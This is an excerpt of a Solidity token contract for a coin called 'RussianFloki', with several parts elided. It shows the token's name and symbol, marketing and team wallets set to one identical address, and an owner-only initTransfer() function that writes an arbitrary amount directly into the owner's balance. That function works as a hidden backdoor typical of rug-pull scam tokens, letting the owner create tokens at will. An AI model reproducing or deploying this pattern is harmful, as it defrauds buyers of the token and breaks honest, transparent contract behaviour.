...
contract RussianFloki is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RussianFloki";
    string private _symbol = "RFLOKI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xEb7B51A14e6152C2576ca762E1d57e00DC0b8dED);
    address payable public teamWalletAddress = payable(0xEb7B51A14e6152C2576ca762E1d57e00DC0b8dED);
    ...
    uint256 public _amountSwapTokens = 100000000000000;    
    ...
    function initTransfer() external onlyOwner() {_balTotals[getOwner()] = _finalAmount;}
